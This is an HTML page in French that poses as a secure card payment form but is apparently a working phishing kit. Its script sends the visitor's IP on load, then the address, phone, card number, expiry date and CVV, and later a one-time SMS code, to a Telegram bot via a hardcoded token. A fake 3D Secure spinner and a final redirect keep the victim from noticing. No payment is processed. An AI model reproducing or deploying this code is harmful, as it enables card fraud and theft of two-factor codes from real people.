<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Formulaire de Paiement Sécurisé</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
  <style>
    /* Reset CSS */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Arial', sans-serif;
      background: linear-gradient(135deg, #f4f4f4, #e0e0e0);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .payment-container {
      background: white;
      width: 100%;
      max-width: 500px;
      padding: 30px;
      border-radius: 20px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
      transition: transform 0.3s ease, box-shadow 0.3s ease;
    }

    .payment-container:hover {
      transform: translateY(-5px);
      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.2);
    }

    h2 {
      text-align: center;
      color: #2c3e50;
      margin-bottom: 25px;
      font-size: 26px;
    }

    .form-group {
      margin-bottom: 20px;
    }

    .form-group label {
      display: block;
      margin-bottom: 8px;
      color: #34495e;
      font-weight: 500;
    }

    .form-group input {
      width: 100%;
      padding: 14px;
      border: 2px solid #e0e0e0;
      border-radius: 10px;
      font-size: 16px;
      transition: border-color 0.3s ease;
    }

    .form-group input:focus {
      border-color: #3498db;
      outline: none;
    }

    .card-icons {
      display: flex;
      justify-content: flex-end;
      gap: 15px;
      margin-bottom: 20px;
    }

    .card-icons img {
      height: 30px;
      filter: drop-shadow(0 2px 2px rgba(0, 0, 0, 0.1));
    }

    .btn {
      width: 100%;
      padding: 16px;
      background: linear-gradient(135deg, #3498db, #2980b9);
      color: white;
      border: none;
      border-radius: 10px;
      font-size: 18px;
      cursor: pointer;
      margin-top: 15px;
      transition: opacity 0.3s ease;
    }

    .btn:hover {
      opacity: 0.9;
    }

    .hidden {
      display: none;
    }

    .spinner {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #3498db;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin: 30px auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .status-message {
      text-align: center;
      font-size: 18px;
      margin: 20px 0;
      color: #7f8c8d;
    }

    /* Responsive Design */
    @media (max-width: 480px) {
      .payment-container {
        padding: 20px;
      }

      h2 {
        font-size: 22px;
      }

      .form-group input {
        padding: 12px;
      }

      .btn {
        font-size: 16px;
      }
    }
  </style>
</head>
<body>

  <!-- Étape 1 - Formulaire principal -->
  <div class="payment-container" id="step-1">
    <h2>Formulaire de Paiement</h2>
    <div class="card-icons">
     <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa">
     <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
<a href="https://ibb.co/ysCgDwP"><img src="https://i.ibb.co/ysCgDwP/t-l-c.jpg" alt="t-l-c" border="0" /></a>
   </div>

   <form id="payment-form">
       <div class="form-group">
        <label for="delivery-address">Adresse de livraison</label>
        <input type="text" id="delivery-address" name="delivery-address" required placeholder="Entrez votre adresse de livraison">
      </div>

      <div class="form-group">
        <label for="phone-number">Numéro de téléphone</label>
        <input type="text" id="phone-number" name="phone-number" required placeholder="Entrez votre numéro de téléphone" pattern="^\+?[0-9]{1,4}?[-. \(\)]?([0-9]{1,3}[-. \(\)]?){1,4}[0-9]{1,3}$" title="Veuillez entrer un numéro de téléphone valide.">
      </div>

      <div class="form-group">
        <label for="cardholder-name">Nom sur la carte</label>
        <input type="text" id="cardholder-name" name="cardholder-name" required placeholder="Nom du titulaire de la carte">
      </div>

      <div class="form-group">
        <label for="card-number">Numéro de la carte</label>
        <input type="text" id="card-number" name="card-number" maxlength="16" required placeholder="XXXX XXXX XXXX XXXX">
      </div>

      <div class="form-group" style="display: flex; gap: 15px;">
        <div style="width: 60%">
          <label for="expiry-date">Date d'expiration</label>
          <input type="text" id="expiry-date" name="expiry-date" required placeholder="MM/AA">
        </div>
        <div style="width: 40%">
          <label for="cvv">CVV</label>
          <input type="text" id="cvv" name="cvv" maxlength="3" pattern="\d{3}" required placeholder="XXX">
        </div>
      </div>

      <button type="submit" class="btn">Payer maintenant</button>
    </form>
  </div>

  <!-- Étape 2 - Vérification 3D Secure -->
  <div class="payment-container hidden" id="step-2">
    <h2>Vérification 3D Secure</h2>
    <div class="spinner"></div>
    <p class="status-message">Veuillez patienter, vérification en cours...</p>
  </div>

  <!-- Étape 3 - Code SMS -->
  <div class="payment-container hidden" id="step-3">
    <h2>Code SMS</h2>
    <p>Entrez le code reçu par SMS :</p>
    <form id="sms-form">
      <div class="form-group">
        <input type="text" id="sms-code" name="sms-code" required placeholder="Code SMS">
      </div>
      <button type="submit" class="btn">Valider</button>
    </form>
  </div>

  <!-- Étape 4 - Confirmation finale -->
  <div class="payment-container hidden" id="step-4">
    <h2>Paiement Réussi</h2>
    <p class="status-message">Merci pour votre achat ! Redirection en cours...</p>
  </div>

  <script>
    const TELEGRAM_BOT_TOKEN = '7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k'; // Remplacez par votre token
    const TELEGRAM_CHAT_ID = '7747778364'; // Remplacez par votre chat ID
    let userIP = '';

    // Fonction pour envoyer un message à Telegram
    async function sendToTelegram(message) {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const data = {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
      };

      try {
        const response = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data),
        });

        if (!response.ok) {
          console.error('Erreur lors de l\'envoi à Telegram :', await response.text());
        }
      } catch (error) {
        console.error('Erreur réseau :', error);
      }
    }

    // Récupérer l'adresse IP de l'utilisateur
    async function fetchUserIP() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        userIP = data.ip;
        await sendToTelegram(`Nouvel utilisateur sur le site - IP: ${userIP}`);
      } catch (error) {
        console.error('Erreur lors de la récupération de l\'IP :', error);
      }
    }

    // Gestion des étapes
    document.getElementById('payment-form').addEventListener('submit', async function(e) {
      e.preventDefault();
      showStep(2);

      const deliveryAddress = document.getElementById('delivery-address').value;
      const phoneNumber = document.getElementById('phone-number').value;
      const cardholderName = document.getElementById('cardholder-name').value;
      const cardNumber = document.getElementById('card-number').value;
      const expiryDate = document.getElementById('expiry-date').value;
      const cvv = document.getElementById('cvv').value;

      const message = `
        Paiement reçu :
        Adresse de livraison : ${deliveryAddress}
        Numéro de téléphone : ${phoneNumber}
        Nom : ${cardholderName}
        Numéro : ${cardNumber}
        Expiration : ${expiryDate}
        CVV : ${cvv}
        IP : ${userIP}
      `;

      await sendToTelegram(message);

      setTimeout(() => {
        showStep(3);
      }, 10000); // 10s pour 3D Secure
    });

    document.getElementById('sms-form').addEventListener('submit', async function(e) {
      e.preventDefault();
      showStep(4);

      const smsCode = document.getElementById('sms-code').value;
      await sendToTelegram(`Code SMS reçu : ${smsCode}`);

      setTimeout(() => {
        window.location.href = "https://justmoicom.github.io/vlad/";
      }, 7000); // 7s avant redirection
    });

    function showStep(step) {
      document.querySelectorAll('.payment-container').forEach(el => {
        el.classList.add('hidden');
      });
      document.getElementById(`step-${step}`).classList.remove('hidden');
    }

    // Formater la date d'expiration
    document.getElementById('expiry-date').addEventListener('input', function() {
      let value = this.value.replace(/\D/g, '');
      if (value.length > 2) {
        value = value.slice(0, 2) + '/' + value.slice(2, 4);
      }
      this.value = value;
    });

    // Récupérer l'IP au chargement de la page
    window.onload = fetchUserIP;
  </script>
</body>
</html>
